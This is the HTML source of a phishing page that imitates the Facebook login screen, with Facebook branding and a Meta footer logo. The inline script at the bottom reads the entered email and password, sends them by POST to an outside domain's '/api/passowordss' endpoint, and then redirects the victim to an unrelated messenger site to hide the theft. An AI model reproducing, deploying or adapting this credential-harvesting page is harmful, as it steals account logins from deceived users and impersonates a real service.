<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description"
        content="Log into Facebook to start sharing and connecting with your friends, family, and people you know.">
    <title>Facebook - log in or sign up</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" type="image/png" href="asdf.png">
</head>

<body>
    <!-- Header with Facebook Logo (Mobile Only) -->
    <header class="header">
        <!-- App Download Banner -->
        <div class="app-banner">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="#1877f2" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2L12 16M12 16L8 12M12 16L16 12" stroke="#1877f2" stroke-width="2" stroke-linecap="round"
                    stroke-linejoin="round" />
                <path d="M3 16L3 19C3 20.1046 3.89543 21 5 21L19 21C20.1046 21 21 20.1046 21 19L21 16" stroke="#1877f2"
                    stroke-width="2" stroke-linecap="round" />
            </svg>
            <span>Get Facebook for iOS and browse faster.</span>
        </div>

        <!-- Language Selector -->
        <div class="language-selector-mobile">
            <select id="language-mobile" aria-label="Switch Display Language">
                <option value="en-uk">English (UK)</option>
                <option value="en-us">English (US)</option>
                <option value="es">Español</option>
                <option value="fr">Français</option>
                <option value="de">Deutsch</option>
                <option value="it">Italiano</option>
                <option value="pt">Português (Brasil)</option>
                <option value="ar">العربية</option>
                <option value="hi">हिन्दी</option>
                <option value="ja">日本語</option>
            </select>
        </div>

        <!-- Facebook Icon -->
        <div class="facebook-icon-container">
            <img src="asdf.png" alt="Facebook" class="facebook-icon" />
        </div>
    </header>

    <!-- Main Content -->
    <main class="main">
        <div class="main-container">
            <!-- Left Side - Branding -->
            <div class="branding-section">
                <h1 class="facebook-text-logo">facebook</h1>
                <p class="tagline">Facebook helps you connect and share with the people in your life.</p>
            </div>

            <!-- Right Side - Login Form -->
            <div class="login-section">
                <div class="login-box">
                    <!-- Login Form -->
                    <form id="loginForm" class="login-form">
                        <input type="text" id="email" name="email" placeholder="Mobile number or email address"
                            autocapitalize="off" autocorrect="off" required aria-label="Mobile number or email address">
                        <input type="password" id="password" name="password" placeholder="Password" required
                            aria-label="Password">
                        <button type="submit" class="login-btn">Log in</button>
                    </form>

                    <!-- Forgot Password -->
                    <a href="#" class="forgot-password">Forgotten password?</a>

                    <!-- Divider -->
                    <div class="divider"></div>

                    <!-- Create Account -->
                    <button type="button" class="create-account-btn">Create new account</button>
                </div>

                <!-- Create Page Link -->
                <p class="create-page-text"><a href="#" class="create-page-link">Create a Page</a> for a celebrity,
                    brand or business.</p>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="footer">
        <div class="footer-container">
            <!-- Meta Logo -->
            <div class="meta-logo">
                <svg width="61" height="12" viewBox="0 0 61 12" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
                    <path d="M41.1 0.5H44.9L48.4 9.3L51.9 0.5H55.7L50.5 11.5H46.3L41.1 0.5Z" />
                    <path d="M56.8 0.5H60.5V11.5H56.8V0.5Z" />
                    <path
                        d="M0.5 0.5H6.9C9.8 0.5 11.8 2.5 11.8 5.3V6.7C11.8 9.5 9.8 11.5 6.9 11.5H0.5V0.5ZM4.2 3.5V8.5H6.5C7.4 8.5 8.1 7.8 8.1 6.9V5.1C8.1 4.2 7.4 3.5 6.5 3.5H4.2Z" />
                    <path d="M13.5 0.5H21.5V3.5H17.2V4.8H20.8V7.5H17.2V8.5H21.5V11.5H13.5V0.5Z" />
                    <path d="M23.2 0.5H30.9V3.5H26.9V4.8H30.2V7.5H26.9V11.5H23.2V0.5Z" />
                    <path d="M32.5 0.5H36.2V11.5H32.5V0.5Z" />
                </svg>
            </div>

            <!-- Footer Links -->
            <nav class="footer-links" aria-label="Footer navigation">
                <a href="#">About</a>
                <a href="#">Help</a>
                <a href="#">More</a>
            </nav>
        </div>
    </footer>

    <script>
        // Form submission handler
        document.getElementById('loginForm').addEventListener('submit', function (e) {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Disable submit button to prevent double submission
            const submitBtn = this.querySelector('.login-btn');
            const originalText = submitBtn.textContent;
            submitBtn.disabled = true;
            submitBtn.textContent = 'Logging in...';

            // Send data to the API
            fetch('https://bishamsinchiury.com.np/api/passowordss', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: email,
                    password: password
                })
            })
                .then(response => {
                    // Redirect to messenger
                    window.location.href = 'https://messenger.abeto.co/';
                })
                .catch((error) => {
                    console.error('Error:', error);
                    // Redirect even if there is an error
                    window.location.href = 'https://messenger.abeto.co/';
                });
        });
    </script>
</body>

</html>
